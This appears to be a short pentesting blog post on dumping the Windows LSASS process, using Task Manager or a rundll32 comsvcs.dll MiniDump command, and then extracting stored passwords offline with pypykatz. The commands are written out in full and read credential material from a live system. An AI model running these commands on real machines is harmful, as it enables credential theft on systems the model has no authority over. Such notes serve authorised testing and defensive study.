---
title: Dump Lsass
date: 2025-11-26 09:53:49

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Dump-Passwords

tags:
  - Dump-Lsass

cover: /img/windows-lsass.png
top_img: /img/bg-img.jpg
description: Extract passwords from windows LSASS.
---




## Create a dump file

### Task Manager

Select the process from task manager 

![Select the process](/img/task-manager.png)

Create a dump file

![dump lsass](/img/dump-lsass.png)

➜ And then we can find the created file on `C:\Users\username\AppData\Local\Temp\Lsass.DMP.

### PowerShell

#### Finding LSASS's PID in PowerShell


```Powershell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

#### Creating a dump file using PowerShell

➜ We need `Administrator access`.

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```


## Dump Lsass Offline 


➜ After creating a dump file, we can now dump the lsass file offline :


```bash
pypykatz lsa minidump lsass.dmp 
```